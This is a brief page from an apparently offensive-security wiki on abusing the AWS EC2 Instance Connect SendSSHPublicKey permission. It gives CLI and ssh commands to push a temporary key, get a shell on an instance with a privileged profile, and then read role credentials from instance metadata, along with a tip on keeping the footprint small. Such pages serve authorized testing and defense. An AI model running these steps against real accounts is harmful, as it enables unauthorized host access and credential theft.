---
title: "Instance Connect: push a temporary SSH key to a privileged instance"
description: "ec2-instance-connect:SendSSHPublicKey to push a temporary key to an instance carrying a privileged profile and log in."
keywords:
  - EC2 Instance Connect
  - SendSSHPublicKey
  - SSH
  - instance profile
  - login
---

# Instance Connect

EC2 Instance Connect pushes a short-lived SSH public key to a running instance's metadata for a 60-second login window. `ec2-instance-connect:SendSSHPublicKey` against an instance that carries a privileged **instance profile** gets you a shell on it, where IMDS hands out the profile role's credentials.

## Push a key and connect

```bash
aws ec2-instance-connect send-ssh-public-key \
  --instance-id <id> --instance-os-user ec2-user \
  --ssh-public-key "$(cat ~/.ssh/id_ed25519.pub)"
ssh ec2-user@<instance-ip>        # within 60s of the push
# on the box, read the profile role creds from IMDS
```

## Exploitation notes

- You need network reachability to the instance (public IP or a route in), plus `SendSSHPublicKey` and the instance running the Instance Connect agent.
- Once on the host, retrieval of the role credentials follows [instance metadata](../../../credentials/instance-metadata/index.md).
- The pushed key is ephemeral, which keeps the footprint small compared with editing `authorized_keys`.

## Tools

- **AWS CLI** (`ec2-instance-connect send-ssh-public-key`).

## References

- [AWS: EC2 Instance Connect](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-methods.html)
- [HackTricks Cloud: AWS EC2 privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-ssm-and-vpc-enum.html)
